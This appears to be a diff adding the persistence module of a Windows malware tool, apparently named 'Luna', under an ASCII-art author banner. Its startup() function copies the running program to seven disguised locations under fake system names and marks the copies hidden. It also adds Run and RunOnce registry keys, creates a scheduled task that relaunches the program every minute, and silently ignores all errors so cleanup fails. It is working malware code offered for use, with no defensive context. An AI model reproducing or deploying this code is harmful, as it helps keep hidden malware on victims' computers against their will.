@@ -1,0 +1,79 @@
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
+⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
+⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ---- provided by 9ukx
+⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀    -- @ashihiro/9ukx 
+⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀     - shiroshome.vercel.app
+⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀
+
+
+
+def startup(self):
+    # API Setup for low-level Windows interaction
+    kernel32 = ctypes.windll.kernel32
+    advapi32 = ctypes.windll.advapi32
+    
+    # Determine the current executable path for replication
+    source_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
+ 
+    # --- 1. EXTENDED PATH REDUNDANCY (Shadow Copies) ---
+    # Targeting a mix of User, System, and Hidden directories to evade simple cleanup
+    target_paths = [
+        os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "sys_update.exe"),
+        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Windows", "Cursors", ".system", "luna_helper.exe"),
+        os.path.join(os.getenv("USERPROFILE"), "Documents", ".config", "update_svc.exe"),
+        os.path.join(os.getenv("APPDATA"), ".config", "Microsoft", "SystemData", "luna_svc.exe"),
+        os.path.join(os.getenv("TEMP"), ".sys", "cache_helper.exe"),
+        os.path.join(os.getenv("WINDIR"), "System32", "drivers", "luna_core.sys"),
+        os.path.join(os.getenv("USERPROFILE"), ".data", "cache", "helper.exe")
+    ]
+    
+    for path in target_paths:
+        try:
+            # Ensure directory exists and overwrite existing file
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            shutil.copy2(source_path, path)
+            # Set attributes to Hidden (2) and System (4)
+            kernel32.SetFileAttributesW(path, 0x02 | 0x04)
+        except:
+            continue
+ 
+    # --- 2. MULTI-VECTOR REGISTRY PERSISTENCE ---
+    # Implementing both HKCU (Current User) and HKLM (Local Machine) for redundancy
+    reg_keys = [
+        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "LunaUpdate"),
+        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "LunaSystemSvc"),
+        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "LunaBoot")
+    ]
+    
+    for root, path, name in reg_keys:
+        try:
+            key = winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, source_path)
+            winreg.CloseKey(key)
+        except:
+            pass
+ 
+    # --- 3. SCHEDULED TASK PERSISTENCE (T1053.005) ---
+    # Uses schtasks to create a task that runs every 1 minute as a fallback
+    try:
+        task_name = "LunaSysMaintenance"
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{source_path}" /sc minute /mo 1 /f'
+        subprocess.run(cmd, shell=True, capture_output=True)
+    except Exception:
+        pass
+    # --- 4. LOW-LEVEL API PERSISTENCE (Registry Run Keys) ---
+    try:
+        # Target HKEY_CURRENT_USER for non-privileged persistence
+        reg_key = winreg.HKEY_CURRENT_USER
+        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_SET_VALUE) as key_handle:
+            winreg.SetValueEx(key_handle, "LunaSysCore", 0, winreg.REG_SZ, source_path)
+    except Exception:
+        pass
